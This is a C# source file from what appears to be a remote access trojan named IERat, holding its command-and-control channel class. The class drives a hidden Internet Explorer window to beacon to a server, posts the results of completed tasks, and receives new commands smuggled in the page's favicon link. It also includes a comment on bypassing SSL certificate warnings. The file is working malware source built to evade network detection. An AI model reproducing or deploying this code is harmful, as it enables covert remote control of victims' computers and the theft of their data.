using mshtml;
using SHDocVw;
using System;
using System.Text;
using System.Threading;

namespace IERat.lib
{
    class Channel
    {
        public Channel()
        {
            Status = "Connecting";
            agent = new Agent();
        }
        public string Status { get; set; }
        public bool IEvisible { get; set; }
        public Agent agent { get; set; }

        static InternetExplorer IE_handler = null;
        public string CurrentRequest { get; set; }
        public string BaseURL { get; set; }
        public int SleepTime { get; set; }
        void DocumentComplete(object pDisp, ref object URL)
        {
            if (IE_handler.LocationURL.Contains(this.BaseURL))
            {
                HTMLDocument DOM = (HTMLDocument)IE_handler.Document;
                var Links = DOM.getElementsByTagName("link");
                try
                {
                    foreach (IHTMLElement Link in Links)
                    {
                        if (Link.getAttribute("rel").Contains("icon")) 
                        {
                            string favicon = Link.getAttribute("href"); // command goes here [icon]
                            Utils.ParseTask(favicon);
                        }
                    }
                }
                catch
                {
                   Console.WriteLine("Error - favicon not found in DOM"); 
                }
            }
        }
        public void Open()
        {
            IE_handler = new InternetExplorer { Visible = IEvisible };
            IE_handler.DocumentComplete += new DWebBrowserEvents2_DocumentCompleteEventHandler(DocumentComplete);
            Thread thread = new Thread(new ThreadStart(Start));
            thread.Start();
        }

        public void Close()
        {
            IE_handler.Quit();
            this.Status = "Killed";
        }
        public void Start()
        {
            while (true)
            {           
                try
                {
                    RequestObject requestObject = new RequestObject(agent.ID);
                    // look for completed tasks and add results to the request
                    while (IERat.channel.agent.CompletedAgentTasks.Count != 0)
                    {
                        TaskObject task = IERat.channel.agent.CompletedAgentTasks.Dequeue();
                        requestObject.CompletedTasks.Add(task);
                    }

                    string output, EndPoint;

                    if (this.Status == "Connecting") {
                        output = agent.GenerateBeacon();
                        EndPoint = "auth";
                    }
                    else
                    {
                        output = requestObject.ToJSON();
                        EndPoint = "fetch";
                    }

                    object PostData = ASCIIEncoding.ASCII.GetBytes(output);
                    string URL = BaseURL + "/api/v1/" + EndPoint;
                    IE_handler.Navigate(URL, Type.Missing, Type.Missing, ref PostData, "Content-Type: application/json; charset=utf-8");

                    // to bypass ssl certificate validation use:
                    // https://www.fl0re.com/2019/11/06/powershell-internet-explorer-automation-part-2/
                    /*
                     * #Make sure the page is ready.
                        while($objInternetExplorer.ReadyState -ne 4)
                        {
                            Start-Sleep -Milliseconds 100;
                        }

                        $objInternetExplorer.Document.IHTMLDocument3_getElementById("overridelink").Click();
                     */

                }
                catch (Exception ex)
                {
                    this.Status = "Disconnected";
                    Console.WriteLine(ex.GetBaseException().Message);
                }

                Thread.Sleep(this.SleepTime);
            }
        }
    }
}
